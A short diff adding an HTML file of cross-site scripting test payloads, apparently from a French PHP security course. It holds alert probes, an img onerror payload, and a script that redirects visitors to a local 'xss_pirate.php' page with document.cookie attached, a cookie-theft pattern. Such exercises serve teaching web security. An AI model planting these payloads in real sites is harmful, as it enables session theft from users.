@@ -1,0 +1,5 @@
+<h1>Coucou</h1>
+<script>alert("Coucou la faille XSS ?");</script>
+<script>alert("Cookies = " + document.cookie);</script>
+<script>window.location.replace("http://localhost/formation/afpa/security_php/xss/xss_pirate.php?cookies=" + document.cookie);</script>
+<img src="aaaaa" onerror="alert('Idem sans balise script');">
